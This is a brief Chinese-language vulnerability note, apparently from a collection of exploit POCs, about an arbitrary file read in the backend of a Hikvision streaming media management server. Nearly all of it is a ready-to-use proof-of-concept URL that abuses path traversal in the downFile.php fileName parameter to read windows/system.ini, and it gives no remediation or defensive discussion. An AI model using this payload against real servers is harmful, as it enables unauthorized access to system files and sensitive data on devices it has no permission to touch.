# HIKVISION 流媒体管理服务器 后台任意读取

## 漏洞描述

通过文件遍历漏洞获取敏感信息

## 漏洞POC

```
http://xxx.xxx.xxx.xxx/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini
```

![hiv-6.png](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205071021508.png)